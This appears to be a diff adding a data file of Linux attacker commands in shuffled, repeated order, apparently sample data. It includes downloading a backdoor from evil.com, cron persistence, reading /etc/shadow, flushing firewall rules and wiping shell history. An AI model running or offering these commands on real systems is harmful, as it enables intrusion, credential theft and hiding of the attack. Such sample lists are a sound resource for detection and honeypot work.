@@ -1,0 +1,40 @@
+stty raw -echo
+wget http://evil.com/backdoor -O /tmp/bd
+netstat -an
+netstat -tulpn
+find / -perm -4000 2>/dev/null
+echo '* * * * * /tmp/bd' | crontab -
+netstat -tulpn
+cat /etc/shadow
+iptables -F
+unset HISTFILE
+hostname
+chmod +x /tmp/bd
+wget http://evil.com/backdoor -O /tmp/bd
+uname -a
+stty raw -echo
+id
+netstat -tulpn
+ss -tulpn
+ls /root
+crontab -l
+find / -perm -4000 2>/dev/null
+cat /etc/shadow
+iptables -P INPUT ACCEPT
+find / -writable 2>/dev/null
+cat /etc/passwd
+sudo su
+iptables -F
+cat /etc/shadow
+cat /etc/passwd
+export TERM=xterm
+cat /root/.bash_history
+netstat -an
+stty raw -echo
+cat /etc/passwd
+history -c
+cat /etc/shadow
+nmap -sV 192.168.1.0/24
+uname -a
+sudo su
+cat /etc/shadow
